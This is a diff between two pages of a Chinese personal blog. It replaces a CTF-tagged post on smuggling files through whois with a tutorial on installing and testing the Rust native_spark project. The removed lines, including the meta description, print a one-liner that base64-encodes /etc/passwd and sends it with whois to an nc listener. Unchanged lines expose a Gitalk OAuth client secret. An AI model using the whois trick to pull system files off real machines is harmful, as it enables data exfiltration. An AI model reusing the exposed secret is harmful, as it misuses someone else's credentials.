@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <title>利用Whois传输小文件。 &mdash; 张建新</title>
+    <title>Rust Native Spark Sample Install &mdash; 张建新</title>
       <!-- or -->
 
     <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
@@ -25,28 +25,28 @@
     
 
     
-    <link rel="canonical" href="https://firsh.me/2019/09/02/use-whois-send-file-hack/">
+    <link rel="canonical" href="https://firsh.me/2019/12/26/native_spark-study1/">
     <link rel="alternate" type="application/atom+xml" title="张建新" href="/feed.xml">
     <link rel="shortcut icon" href="/favicon.ico">
     
-    <meta property="og:title" content="利用Whois传输小文件。">
+    <meta property="og:title" content="Rust Native Spark Sample Install">
       
-    <meta name="keywords" content="whois 渗透">
-    <meta name="og:keywords" content="whois 渗透">
+    <meta name="keywords" content="fast spark native spark">
+    <meta name="og:keywords" content="fast spark native spark">
       
-    <meta name="description" content="传输机：root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`接受机：root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d">
-    <meta name="og:description" content="传输机：root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`接受机：root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d">
+    <meta name="description" content="本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。">
+    <meta name="og:description" content="本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。">
       
     
     
         
     
-    <meta property="og:url" content="https://firsh.me/2019/09/02/use-whois-send-file-hack/">
+    <meta property="og:url" content="https://firsh.me/2019/12/26/native_spark-study1/">
     <meta property="og:site_name" content="张建新">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
     
-    <meta property="article:published_time" content="2019-09-02">
+    <meta property="article:published_time" content="2019-12-26">
     
     <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
     <script>
@@ -97,22 +97,22 @@
     </header>
     <!-- / header -->
 
-    <section class="collection-head small geopattern" data-pattern-id="利用Whois传输小文件。">
+    <section class="collection-head small geopattern" data-pattern-id="Rust Native Spa">
 <div class="container">
   <div class="columns">
     <div class="column three-fourths">
       <div class="collection-title">
-        <h1 class="collection-header">利用Whois传输小文件。</h1>
+        <h1 class="collection-header">Rust Native Spark Sample Install</h1>
         <div class="collection-info">
           
           <span class="meta-info">
-            <span class="octicon octicon-calendar"></span> 2019/09/02
+            <span class="octicon octicon-calendar"></span> 2019/12/26
           </span>
           
           
           <span class="meta-info">
             <span class="octicon octicon-file-directory"></span>
-            <a href="/categories/#CTF" title="CTF">CTF</a>
+            <a href="/categories/#spark" title="spark">spark</a>
           </span>
           
         </div>
@@ -126,11 +126,92 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>传输机：
-root@john:~# whois <span class="nt">-h</span> 127.0.0.1 <span class="nt">-p</span> 4444 <span class="sb">`</span><span class="nb">cat</span> /etc/passwd | <span class="nb">base64</span><span class="sb">`</span>
-接受机：
-root@john:/tmp# nc <span class="nt">-l</span> <span class="nt">-v</span> <span class="nt">-p</span> 4444 | <span class="nb">sed</span> <span class="s2">"s/ //g"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+    <p>本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。</p>
+
+<h3 id="介绍-native-spark-for-rust">介绍 Native Spark For Rust</h3>
+
+<ul>
+  <li>github 地址 ： https://github.com/rajasekarv/native_spark</li>
+</ul>
+
+<h3 id="sample">Sample</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## clone project </span>
+git clone https://github.com/rajasekarv/native_spark
+<span class="c">## Use Ubuntu18.04</span>
+
+    curl <span class="nt">-ssf</span> https://sh.rustup.rs | sh  <span class="c"># 如果失败 curl https://sh.rustup.rs &gt; a.sh &amp;&amp; ./a.sh -y 强制执行</span>
+     apt <span class="nb">install </span>openssl
+     apt <span class="nb">install </span>openssl-dev
+     apt <span class="nb">install </span>openssl-sys
+     apt <span class="nb">install </span>libssl-dev
+<span class="c">## clone capnproto </span>
+<span class="c">## 序列化工具包</span>
+git clone https://github.com/sandstorm-io/capnproto.git
+<span class="nb">cd </span>capnproto
+<span class="nb">sudo  </span>apt <span class="nb">install </span>autoreconf
+<span class="nb">sudo  </span>apt <span class="nb">install </span>autoconf
+<span class="nb">sudo  </span>apt <span class="nb">install </span>automake
+<span class="nb">sudo  </span>apt <span class="nb">install </span>libtool
+autoreconf <span class="nt">-i</span>
+./configure 
+make <span class="nt">-j4</span> check
+<span class="nb">sudo </span>make <span class="nb">install</span> 
+
+<span class="c">## 进入项目测试</span>
+
+<span class="nb">cd </span>native_spark
+<span class="c">## 安装nightly 版本</span>
+rustup <span class="nb">install </span>nightly
+<span class="c">## 强行覆盖一波</span>
+rustup override <span class="nb">set </span>nightly
+<span class="c">## run example </span>
+cargo run <span class="nt">--example</span> make_rdd
+
+<span class="c">## cd native_spark/docker</span>
+<span class="c"># build docker 镜像</span>
+./build_image.sh
+<span class="c"># 启动测试节点 并且将当前的 target 目录映射到 容器内的 /home/dev</span>
+./test_cluster.sh
+
 </code></pre></div></div>
+
+<h2 id="图示">图示</h2>
+
+<ul>
+  <li>看一下代码</li>
+</ul>
+
+<p><img src="http://112firshme11224.test.upcdn.net/blog/2019-12-26-10-46-14.png!100" alt="" /></p>
+
+<ul>
+  <li>启动测试节点</li>
+</ul>
+
+<p><img src="http://112firshme11224.test.upcdn.net/blog/2019-12-26-10-47-39.png!100" alt="" /></p>
+
+<ul>
+  <li>进入Master</li>
+</ul>
+
+<p><img src="http://112firshme11224.test.upcdn.net/blog/2019-12-26-10-48-47.png!100" alt="" /></p>
+
+<ul>
+  <li>测试native_spark</li>
+</ul>
+
+<p><img src="http://112firshme11224.test.upcdn.net/blog/2019-12-26-10-50-53.png!100" alt="" /></p>
+
+<ul>
+  <li>在容器内测试native_spark 集群 <code class="language-plaintext highlighter-rouge">./file_read --deployment_mode distributed --local_ip=0.0.0.0</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">RUST_BACKTRACE</span><span class="o">=</span>full ./file_read <span class="nt">--deployment_mode</span> distributed <span class="nt">--local_ip</span><span class="o">=</span>0.0.0.0
+</code></pre></div></div>
+
+<p><img src="http://112firshme11224.test.upcdn.net/blog/2019-12-26-11-07-11.png!100" alt="" /></p>
+
+<h4 id="未完结">未完结</h4>
 
 <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
 
@@ -146,7 +227,7 @@ root@john:/tmp# nc <span class="nt">-l</span> <span class="nt">-v</span> <span c
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/2019/09/02/use-whois-send-file-hack/',
+            id: '/2019/12/26/native_spark-study1/',
             clientID: '0dc80b46a482ec78f3e0',
             clientSecret: '8cae5d306b3703ad240b74142995473086fcbbab',
             repo: 'blog-comments',
